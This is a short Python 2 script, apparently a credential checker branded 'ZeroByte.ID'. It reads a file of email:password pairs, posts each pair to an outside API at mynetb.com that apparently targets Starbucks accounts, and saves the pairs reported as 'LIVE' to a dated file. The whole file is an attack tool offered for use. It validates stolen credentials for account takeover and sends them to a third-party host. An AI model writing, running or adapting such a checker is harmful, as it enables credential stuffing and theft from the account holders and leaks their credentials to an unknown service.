import requests
import sys
import os
import termcolor
import json
import time
from datetime import datetime

class warna:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
w       = warna.HEADER + " _   ___                  _   _     \n" + warna.ENDC
gans    = warna.HEADER + "| | / (_)                | | | |    \n" + warna.ENDC
sangat  = warna.HEADER + "| |/ / _ _ __ _ __   __ _| |_| |__  \n" + warna.ENDC
kirnath = warna.HEADER + "|    \| | '__| '_ \ / _` | __| '_ \ \n" + warna.ENDC
coded   = warna.HEADER + "| |\  \ | |  | | | | (_| | |_| | | |\n" + warna.ENDC
me      = warna.HEADER + "\_| \_/_|_|  |_| |_|\__,_|\__|_| |_|\n" + warna.ENDC
exit = "[========]"
for l in w:
    sys.stdout.write(l)
    sys.stdout.flush()
    time.sleep(0.01)
for l in gans:
    sys.stdout.write(l)
    sys.stdout.flush()
    time.sleep(0.01)
for l in sangat:
    sys.stdout.write(l)
    sys.stdout.flush()
    time.sleep(0.01)
for l in coded:
    sys.stdout.write(l)
    sys.stdout.flush()
    time.sleep(0.01)
for l in me:
    sys.stdout.write(l)
    sys.stdout.flush()
    time.sleep(0.01)
print warna.BOLD + warna.WARNING + "                       ZeroByte.ID\n" + warna.ENDC + warna.ENDC
tanya = str(raw_input("Enter Mailist File: "))
openfile = open(tanya, 'r')
url = 'http://mynetb.com/api/sbux/api.php'
start_time = time.time()
for i in openfile:
    try:
        r = requests.post(url, data={'mailpass':str(i).replace(' ', '')}, verify=False)
    except requests.exceptions.ConnectionError:
        print "[TIMEOUT]", i
    if "LIVE" in r.text:
        print warna.OKGREEN + str(r.text).replace('\n', '') + warna.ENDC
        live = r.text
        tanggal = datetime.today()
        dtwithoutseconds = tanggal.replace(second=0, microsecond=0)
        date = str(dtwithoutseconds).replace(':', '_').replace(' ', '_')
        filename = u"LIVE-%s.txt"%date
        save = open(filename, 'a')
        save.write(str(live)+'\n')
        save.close()
    elif "DIE" in r.text:
        print warna.FAIL + r.text + warna.ENDC
    elif "UNCHECKED" in r.text:
        print warna.WARNING + "UNCHECKED" + i + warna.ENDC
    else:
        print "Unknown Error, please contact admin"
elapsed_time = time.time() - start_time
print "[+] Job Done!"
print "[+] Total Time: ",elapsed_time
print "[+] Result was Saved as LIVE-{}.txt".format(date)
